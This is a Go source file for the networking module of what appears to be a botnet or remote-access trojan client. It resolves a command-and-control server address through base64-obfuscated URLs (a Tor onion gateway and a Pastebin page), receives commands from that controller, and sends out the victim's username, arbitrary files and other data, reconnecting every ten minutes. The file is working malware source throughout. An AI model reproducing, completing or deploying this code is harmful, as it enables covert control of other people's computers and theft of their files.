package network

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	capnp "zombiezen.com/go/capnproto2"

	"../base64"
	"../utils"
)

var Connection net.Conn
var ip string

func Connect() {
	ip = getIPTor()
	_, err := net.Dial("tcp", ip)
	if err != nil {
		fmt.Println("error")
		utils.Wait(160)
		Connect()
	}
	fmt.Println("connected!")
	Connection, _ = net.Dial("tcp", ip)
}

// Reconnect renews te connection every 10 minutes (To be inproved)
// TODO add automatic reconection when connection dies
func Reconnect() {
	//Every 10 mins
	for {
		utils.Wait(60 * 10)
		Connect()

	}
}

func getIPTor() string {
	// use tikedzh6cg5unkrf.onion/ip.html
	resp, _ := http.Get(base64.Base64Decode("aHR0cDovL3Rpa2Vkemg2Y2c1dW5rcmYub25pb24udG8vaXAuaHRtbA=="))
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)
	return strings.TrimLeft(strings.TrimSpace(string(respBody)), "tcp://")
}

func getIP() string {
	resp, _ := http.Get(base64.Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)

	return strings.TrimLeft(string(respBody), "tcp://")
}

// Send writes to te connection a string using deprecadet method
func Send(pre string, msg string) {
	Connection.Write([]byte(pre + "|" + msg)) //var c is located in client.go
}

func ReciveCommand() (cmd string, target string, args string, date int64) {
	msg, err := capnp.NewDecoder(Connection).Decode()
	if err != nil {
		panic(err)
	}
	// Extract the root struct from the message.
	commad, err := ReadRootCommand(msg)
	if err != nil {
		panic(err)
	}

	// Access fields from the struct.
	cmd, _ = commad.Cmd()
	target, _ = commad.Target()
	args, _ = commad.Args()
	date = commad.Date()
	return
}

// SendData is the new protocol to send to the C&C Host using capn'p
func SendData(data string) {
	msg, seg, err := capnp.NewMessage(capnp.SingleSegment(nil))
	if err != nil {
		panic(err)
	}

	// Create a newclient. Book struct.  Every message must have a root struct.
	cnp, err := NewRootCommand(seg)
	if err != nil {
		panic(err)
	}
	// id
	cnp.SetCmd(utils.GetUsername())
	//Target blanc
	cnp.SetTarget("")
	// Data
	cnp.SetArgs(data)
	cnp.SetDate(time.Now().Unix()) // Set int date
	err = capnp.NewEncoder(Connection).Encode(msg)
	if err != nil {
		panic(err)
	}
}

// SendFile Sends a file given its path
// TODO add tag so server nows what's comming
func SendFile(fileName string) {
	file, err := os.Open(fileName) // For read access.
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close() // make sure to close the file even if we panic.
	_, err = io.Copy(Connection, file)
	if err != nil {
		log.Fatal(err)
	}
}

func SendBig(data io.Reader) {
	io.Copy(Connection, data)
}

func Receive() string {
	status, err := bufio.NewReader(Connection).ReadString('\n')
	if err != nil {
		Connect()
	}

	return status
}
